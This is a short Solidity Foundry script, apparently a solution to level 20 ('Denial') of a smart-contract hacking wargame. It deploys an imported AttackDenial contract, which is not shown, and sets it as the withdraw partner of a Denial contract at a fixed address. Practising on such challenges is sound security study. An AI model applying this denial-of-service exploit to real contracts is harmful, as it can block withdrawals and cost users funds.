// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Denial} from "../src/level20/Denial.sol";
import {AttackDenial} from "../src/level20/AttackDenial.sol";

import "forge-std/console.sol";

contract level20Exploit is Script {
    Denial denial = Denial(payable(0x8341229556532abD4570BD1Ae60DaD7C56F7f83c));

    function run() external {
        vm.startBroadcast();
        AttackDenial attackDenial = new AttackDenial();
        denial.setWithdrawPartner(address(attackDenial));
        vm.stopBroadcast();
    }
}
